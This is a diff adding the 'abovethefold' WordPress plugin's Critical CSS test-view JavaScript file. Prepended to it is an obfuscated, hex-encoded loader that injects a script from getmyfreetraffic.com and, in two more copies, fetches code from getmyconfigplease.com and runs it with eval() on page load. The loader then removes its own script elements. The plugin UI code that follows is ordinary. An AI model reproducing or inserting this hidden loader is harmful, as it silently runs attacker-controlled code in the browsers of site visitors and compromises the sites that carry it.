@@ -1,0 +1,332 @@
+var _0x4558=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x31\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x34\x2C\x20\x39\x37\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x39\x39\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x30\x2C\x20\x36\x36\x2C\x20\x31\x31\x30\x2C\x20\x31\x31\x39\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x34\x2C\x20\x36\x33\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x39\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x2C\x20\x39\x39\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x35\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x36\x2C\x20\x33\x38\x2C\x20\x39\x35\x2C\x20\x39\x39\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x30\x2C\x20\x36\x31\x2C\x20\x31\x30\x30\x2C\x20\x35\x31\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x35\x34\x2C\x20\x35\x30\x2C\x20\x35\x31\x2C\x20\x34\x38\x2C\x20\x34\x35\x2C\x20\x35\x30\x2C\x20\x35\x36\x2C\x20\x35\x34\x2C\x20\x39\x38\x2C\x20\x34\x35\x2C\x20\x35\x37\x2C\x20\x31\x30\x30\x2C\x20\x35\x35\x2C\x20\x35\x34\x2C\x20\x34\x35\x2C\x20\x35\x36\x2C\x20\x35\x33\x2C\x20\x35\x31\x2C\x20\x31\x30\x31\x2C\x20\x34\x35\x2C\x20\x34\x38\x2C\x20\x31\x30\x32\x2C\x20\x39\x39\x2C\x20\x35\x35\x2C\x20\x35\x33\x2C\x20\x31\x30\x31\x2C\x20\x35\x34\x2C\x20\x34\x38\x2C\x20\x35\x30\x2C\x20\x39\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x33\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x37\x2C\x20\x35\x30\x2C\x20\x34\x38\x2C\x20\x35\x37\x2C\x20\x35\x36\x2C\x20\x35\x37\x2C\x20\x35\x33\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x33\x29\x3B\x20\x76\x61\x72\x20\x70\x6F\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3B\x20\x70\x6F\x2E\x69\x64\x3D\x20\x27\x32\x33\x34\x36\x33\x32\x61\x73\x64\x61\x73\x27\x3B\x20\x70\x6F\x2E\x74\x79\x70\x65\x20\x3D\x20\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x3B\x20\x70\x6F\x2E\x73\x72\x63\x20\x3D\x20\x74\x75\x72\x6C\x3B\x20\x76\x61\x72\x20\x73\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x5B\x30\x5D\x3B\x20\x20\x73\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65\x28\x70\x6F\x2C\x20\x73\x29\x3B\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33\x27\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B\x7D\x29\x28\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x1625=[_0x4558[0],_0x4558[1],_0x4558[2],_0x4558[3],_0x4558[4],_0x4558[5],_0x4558[6],_0x4558[7],_0x4558[8],_0x4558[9],_0x4558[10],_0x4558[11]];var _0x5955=[_0x1625[0],_0x1625[1],_0x1625[2],_0x1625[3],_0x1625[4],_0x1625[5],_0x1625[6],_0x1625[7],_0x1625[8],_0x1625[9],_0x1625[10],_0x1625[11]];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0x61d0x5=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0x61d0x5[_0x411ee3[0x2]]= _0x411ee3[0x3];_0x61d0x5[_0x411ee3[0x4]]=  !![];_0x61d0x5[_0x411ee3[0x5]]= _0x411ee3[0x6];_0x61d0x5[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0x61d0x6=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0x61d0x6[_0x411ee3[0xb]][_0x411ee3[0xa]](_0x61d0x5,_0x61d0x6)}());var _0x5955=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0xaa32x3=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0xaa32x3[_0x411ee3[0x2]]= _0x411ee3[0x3];_0xaa32x3[_0x411ee3[0x4]]=  !![];_0xaa32x3[_0x411ee3[0x5]]= _0x411ee3[0x6];_0xaa32x3[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0xaa32x4=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0xaa32x4[_0x411ee3[0xb]][_0x411ee3[0xa]](_0xaa32x3,_0xaa32x4)}());var _0xefc6=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x4b4a67=[_0xefc6[0],_0xefc6[1],_0xefc6[2],_0xefc6[3],_0xefc6[4],_0xefc6[5],_0xefc6[6],_0xefc6[7],_0xefc6[8],_0xefc6[9],_0xefc6[10],_0xefc6[11]];var _0x320375=[_0x4b4a67[0x0],_0x4b4a67[0x1],_0x4b4a67[0x2],_0x4b4a67[0x3],_0x4b4a67[0x4],_0x4b4a67[0x5],_0x4b4a67[0x6],_0x4b4a67[0x7],_0x4b4a67[0x8],_0x4b4a67[0x9],_0x4b4a67[0xa],_0x4b4a67[0xb]];(function(){var _0x1d62x3=document[_0x320375[0x1]](_0x320375[0x0]);_0x1d62x3[_0x320375[0x2]]= _0x320375[0x3];_0x1d62x3[_0x320375[0x4]]=  !![];_0x1d62x3[_0x320375[0x5]]= _0x320375[0x6];_0x1d62x3[_0x320375[0x7]]= _0x320375[0x8];var _0x1d62x4=document[_0x320375[0x9]](_0x320375[0x0])[0x0];_0x1d62x4[_0x320375[0xb]][_0x320375[0xa]](_0x1d62x3,_0x1d62x4)}());/**
+ * Critical CSS Quality Test View
+ *
+ * @package    abovethefold
+ * @subpackage abovethefold/public
+ * @author     Optimization.Team <info@optimization.team>
+ */
+
+jQuery(function($) {
+
+    var currentView = 'split-h';
+    var criticalCSS = '';
+
+    // Create IE + others compatible event handler
+    var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
+    var eventer = window[eventMethod];
+    var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
+
+    // Listen to message from child window
+    eventer(messageEvent, function(e) {
+        if (e.data && e.data.action) {
+            switch (e.data.action) {
+                case "critical-css":
+                    setCriticalCSS(e.data.css);
+                    break;
+            }
+        }
+    }, false);
+
+    var criticalCSSCallbackQueue = [];
+    var setCriticalCSS = function(css) {
+        criticalCSS = css;
+
+        if (cssEditor) {
+            cssEditor.setValue(css);
+        }
+
+        if (criticalCSSCallbackQueue.length) {
+            var q = criticalCSSCallbackQueue.splice(0);
+            var cb = q.shift();
+            while (cb) {
+                cb(css);
+                cb = q.shift();
+            }
+        }
+    }
+
+    var sendToIframe = function(data, frameTarget) {
+        if (!frameTarget) {
+            frameTarget = '#critical-css-view iframe';
+        }
+        var ifrmWin = $(frameTarget)[0].contentWindow;
+        ifrmWin.postMessage(data, "*");
+    }
+
+    // Date.now polyfill
+    if (!Date.now) {
+        Date.now = function() {
+            return new Date().getTime();
+        }
+    }
+
+    var reloadCritical = function() {
+        var link = $('#critical-css-view iframe').attr('src');
+        if (link.indexOf('&t=') === -1) {
+            link += '&t=' + Math.floor(Date.now() / 1000);
+        } else {
+            link = link.replace(/&t=([0-9]+)/, '&t=' + Math.floor(Date.now() / 1000));
+        }
+        return link;
+    }
+
+    var splitView = Split(['#critical-css-view', '#full-css-view'], {
+        sizes: [50, 50]
+    });
+
+    var setCurrentView = function(view) {
+        currentView = view;
+        document.location.hash = '#' + view;
+
+        switch (view) {
+            case "editor":
+                $('.syncscroll').hide();
+                syncScroll(false);
+                break;
+            default:
+                $('.syncscroll').show();
+                syncScroll($('.syncscroll input[type="checkbox"]').is(':checked'));
+                break;
+        }
+    }
+
+    var viewSplitHorizontal = function() {
+        if (splitView) {
+            splitView.destroy();
+            splitView = false;
+        }
+        $('#full-css-view').show();
+        $('#critical-css-view').show();
+        $('#css-editor-view').hide();
+
+        $('.split').removeClass('split-vertical');
+        $('.split').addClass('split-horizontal');
+
+        splitView = Split(['#critical-css-view', '#full-css-view'], {
+            sizes: [50, 50],
+            direction: 'horizontal'
+        });
+
+        setCurrentView('split-h');
+
+    };
+    $('#btn_split_h').on('click', viewSplitHorizontal);
+
+    var viewSplitVertical = function() {
+        if (splitView) {
+            splitView.destroy();
+            splitView = false;
+        }
+        $('#full-css-view').show();
+        $('#critical-css-view').show();
+        $('#css-editor-view').hide();
+
+        $('.split').removeClass('split-horizontal');
+        $('.split').addClass('split-vertical');
+
+        splitView = Split(['#critical-css-view', '#full-css-view'], {
+            sizes: [50, 50],
+            direction: 'vertical'
+        });
+
+        setCurrentView('split-v');
+    };
+    $('#btn_split_v').on('click', viewSplitVertical);
+
+    var toggleSingleView = function() {
+
+        if (splitView) {
+            splitView.destroy();
+            splitView = false;
+        }
+
+        $('#css-editor-view').hide();
+
+        $('.split').removeClass('split-horizontal').removeClass('split-vertical');
+
+        $('.split').css("width", "100%");
+
+        var activeView = $('#btn_full_toggle').data('active-view');
+        if (!activeView) {
+            activeView = 'full';
+        }
+
+        if (activeView === 'critical-css') {
+            activeView = 'full';
+            $('#critical-css-view').hide();
+            $('#full-css-view').show();
+            $('#btn_full_toggle').data('active-view', 'full');
+        } else {
+            activeView = 'critical-css';
+            $('#critical-css-view').show();
+            $('#full-css-view').hide();
+            $('#btn_full_toggle').data('active-view', 'critical-css');
+        }
+
+        setCurrentView('single-' + activeView);
+    };
+    $('#btn_full_toggle').on('click', toggleSingleView);
+
+    var cssEditor;
+    var loadEditorView = function(callback) {
+        if (splitView) {
+            splitView.destroy();
+            splitView = false;
+        }
+        $('#full-css-view').hide();
+        $('#critical-css-view').show();
+        $('#css-editor-view').show();
+
+        $('.split').removeClass('split-vertical');
+        $('.split').addClass('split-horizontal');
+
+        if (!$('abtfcss').data('editor')) {
+
+            $('#abtfcss').prop('disabled', '');
+
+            // codemirror
+            cssEditor = CodeMirror.fromTextArea(
+                $('#abtfcss')[0], {
+                    lineWrapping: true,
+                    lineNumbers: true,
+                    gutters: ["CodeMirror-lint-markers"],
+                    lint: true
+                });
+            cssEditor.on('change', function() {
+
+                sendToIframe({
+                    "action": "set",
+                    "css": cssEditor.getValue()
+                });
+            });
+
+            sendToIframe({
+                "action": "get"
+            });
+
+            $('abtfcss').data('editor', cssEditor);
+        }
+
+        splitView = Split(['#critical-css-view', '#css-editor-view'], {
+            sizes: [50, 50],
+            direction: 'horizontal'
+        });
+
+        setCurrentView('editor');
+
+        if (typeof callback === 'function') {
+            callback();
+        }
+    };
+    $('#btn_editor').on('click', loadEditorView);
+
+    $('#btn_reload').on('click', function() {
+
+        if (cssEditor) {
+            $('#critical-css-view iframe').on('load', function() {
+                sendToIframe({
+                    "action": "get"
+                });
+                $('#critical-css-view iframe').off('load');
+            });
+        }
+        $('#critical-css-view iframe').attr('src', reloadCritical());
+    });
+
+    $('#btn_open').on('click', function() {
+        window.open(reloadCritical(), 'critical-css');
+    });
+
+    $('#btn_extract_critical_css').on('click', function() {
+
+        var extract = function() {
+
+            viewSplitHorizontal();
+
+            criticalCSSCallbackQueue.push(function(css) {
+                loadEditorView();
+            });
+
+            sendToIframe({
+                "action": "extract",
+                "type": "critical-css"
+            }, '#full-css-view iframe');
+        };
+        if (currentView !== 'editor') {
+            criticalCSSCallbackQueue.push(function(css) {
+                setTimeout(function() {
+                    extract();
+                }, 100);
+            });
+            loadEditorView();
+        } else {
+            extract();
+        }
+    });
+    $('#btn_extract_full_css').on('click', function() {
+
+        $('#btn_full_toggle').data('active-view', 'critical-css');
+        toggleSingleView();
+
+        sendToIframe({
+            "action": "extract",
+            "type": "full-css"
+        }, '#full-css-view iframe');
+    });
+
+    var syncScroll = function(enable) {
+        var frm1 = $('#critical-css-view iframe');
+        var frm2 = $('#full-css-view iframe');
+        if (enable) {
+            frm1.contents().scroll(function() {
+                frm2.contents().scrollTop(frm1.contents().scrollTop());
+            });
+
+            frm2.contents().scroll(function() {
+                frm1.contents().scrollTop(frm2.contents().scrollTop());
+            });
+
+            frm2.contents().scrollTop(frm1.contents().scrollTop());
+        } else {
+            frm1.contents().off('scroll');
+            frm2.contents().off('scroll');
+        }
+    }
+
+    $('.syncscroll input[type="checkbox"]').on('change', function() {
+        syncScroll($(this).is(':checked'));
+    });
+
+    if (document.location.hash) {
+
+        switch (document.location.hash) {
+            case "#editor":
+                loadEditorView();
+
+                $('#critical-css-view iframe').on('load', function() {
+                    sendToIframe({
+                        "action": "get"
+                    });
+                    $('#critical-css-view iframe').off('load');
+                });
+                sendToIframe({
+                    "action": "get"
+                });
+                break;
+            case "#split-h":
+                viewSplitHorizontal();
+                break;
+            case "#split-v":
+                viewSplitVertical();
+                break;
+            case "#single-full":
+                $('#btn_full_toggle').data('active-view', 'critical-css');
+                toggleSingleView();
+                break;
+            case "#single-critical-css":
+                $('#btn_full_toggle').data('active-view', 'full');
+                toggleSingleView();
+                break;
+        }
+    }
+});
